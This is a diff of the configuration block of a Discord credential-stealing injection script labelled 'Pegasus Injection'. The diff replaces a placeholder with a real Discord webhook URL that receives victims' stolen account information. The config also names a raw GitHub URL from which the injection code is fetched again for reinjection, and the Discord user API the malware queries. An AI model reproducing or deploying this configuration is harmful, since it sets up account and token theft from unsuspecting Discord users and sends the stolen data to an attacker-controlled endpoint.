@@ -11,7 +11,7 @@ const config = {
   embed_name: 'Pegasus Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg'.replace(/ /g,'%20'), 
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "%WEBHOOK%", //your discord webhook there obviously
+  webhook: "https://discord.com/api/webhooks/977296568195641384/bB3u88K0AXqu_xKiS-dnyTHbLjrLe7HzXjU5xRhQpayz2x7zNNa0GdgkG2FC3EIZ2PFA", //your discord webhook there obviously
   injection_url: 'https://raw.githubusercontent.com/KaZerDev/test/main/injection.js', //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
